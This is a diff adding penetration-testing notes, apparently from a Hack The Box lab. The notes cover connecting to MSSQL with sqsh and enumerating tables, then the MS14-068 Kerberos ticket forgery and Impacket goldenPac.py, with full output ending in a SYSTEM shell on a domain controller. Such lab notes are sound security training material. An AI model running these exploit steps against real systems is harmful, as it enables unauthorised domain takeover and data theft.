@@ -1,2 +1,73 @@
-#sql mssql microsoft windows server
+#sql mssql microsoft windows server sqsh golden ticket
+
+#Edit a file and enter similar to the following:
+[MyServer]
+host = 192.168.1.10
+port = 1433
+tds version = 8.0
+And lastly, we’ll edit ~/.sqshrc:
+
+#Edit ~/.sqshrc and add your creds and environment display type
+\set username=sa
+\set password=password
+\set style=vert
+
+#Connect to the MSSQL server:
+sqsh -S MyServer
+
+#Query
+SELECT name FROM master..sysdatabases
+go
+
+#Can also do this:
+sqsh -I /etc/freetds/freetds.conf -Smyserver  -Uknb -Pverysecret -Dmydb
+
+#Navigating through the DB:
+1. SELECT name FROM master.dbo.sysdatabases
+2. go
+3. SELECT * FROM orcharddb.INFORMATION_SCHEMA.TABLES
+4. go
+5. SELECT * FROM orcharddb.INFORMATION_SCHEMA.COLUMNS
+6. go
+7. USE orcharddb
+8. go
+9. SELECT * FROM blog_Orchard_Users_UserPartRecord
+10. go
+
+#create ticket from user/pass/SID (via MS14-068 / CVE-2014-6324):
+root@operator:~/HTB/BOXES/MANTIS_10.10.10.52# python ms14-068.py -u james@htb.local -d mantis.htb.local -p'REDACTED' -s S-1-5-21-4220043660-4019079961-2895681657
+  [+] Building AS-REQ for mantis.htb.local... Done!
+  [+] Sending AS-REQ to mantis.htb.local... Done!
+  [+] Receiving AS-REP from mantis.htb.local... Done!
+  [+] Parsing AS-REP from mantis.htb.local... Done!
+  [+] Building TGS-REQ for mantis.htb.local... Done!
+  [+] Sending TGS-REQ to mantis.htb.local... Done!
+  [+] Receiving TGS-REP from mantis.htb.local... Done!
+  [+] Parsing TGS-REP from mantis.htb.local... Done!
+  [+] Creating ccache file 'TGT_james@htb.local.ccache'... Done!
+root@operator:~/HTB/BOXES/MANTIS_10.10.10.52#
+
+#Rename Domain Admin ticket:
+root@operator:~/HTB/BOXES/MANTIS_10.10.10.52# cp TGT_james@htb.local.ccache /tmp/krb5cc_0
+
+#Use goldenPac.py to gain shell (NOTE: had to add the domain and the computer in /etc/hosts, and use the name of the computer after the @ in the command):
+root@operator:~/HTB/BOXES/MANTIS_10.10.10.52# goldenPac.py -dc-ip 10.10.10.52 -target-ip 10.10.10.52 htb.local/james:REDACTED@mantis.htb.local
+Impacket v0.9.19-dev - Copyright 2018 SecureAuth Corporation
+
+[*] User SID: S-1-5-21-4220043660-4019079961-2895681657-1103
+[*] Forest SID: S-1-5-21-4220043660-4019079961-2895681657
+[*] Attacking domain controller 10.10.10.52
+[*] 10.10.10.52 found vulnerable!
+[*] Requesting shares on 10.10.10.52.....
+[*] Found writable share ADMIN$
+[*] Uploading file EuQClhUY.exe
+[*] Opening SVCManager on 10.10.10.52.....
+[*] Creating service nQRy on 10.10.10.52.....
+[*] Starting service nQRy.....
+[!] Press help for extra shell commands                                                                                                 Microsoft Windows [Version 6.1.7601]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+C:\Windows\system32>whoami                                                                                                              nt authority\system
+t authority\system
+
 
